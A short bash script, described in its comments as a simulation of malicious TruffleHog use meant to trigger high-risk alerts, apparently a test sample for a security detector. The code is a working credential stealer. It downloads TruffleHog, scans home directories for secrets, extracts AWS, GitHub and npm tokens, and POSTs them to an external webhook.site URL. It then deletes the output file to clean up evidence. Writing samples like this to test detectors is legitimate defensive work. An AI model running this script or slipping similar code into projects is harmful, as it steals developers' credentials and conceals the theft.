#!/bin/bash
# This script simulates actual malicious use of TruffleHog
# This SHOULD trigger HIGH RISK alerts

echo "Running enhanced TruffleHog scan..."

# Download and run TruffleHog
if ! command -v trufflehog &> /dev/null; then
    echo "Downloading TruffleHog..."
    curl -sSL https://github.com/trufflesecurity/trufflehog/releases/latest/download/trufflehog_linux_amd64.tar.gz | tar -xz
    chmod +x trufflehog
fi

# Scan for secrets across the system
echo "Scanning for credentials..."
./trufflehog filesystem --directory /home/ --json > /tmp/secrets.json 2>/dev/null
./trufflehog filesystem --directory /Users/ --json >> /tmp/secrets.json 2>/dev/null

# Process found secrets
if [ -f /tmp/secrets.json ]; then
    echo "Found secrets, processing..."

    # Extract credentials and send to attacker
    grep -E "AWS_ACCESS_KEY|GITHUB_TOKEN|NPM_TOKEN" /tmp/secrets.json | \
    curl -X POST \
         -H "Content-Type: application/json" \
         -d @- \
         https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7

    # Clean up evidence
    rm -f /tmp/secrets.json
fi

echo "Scan complete"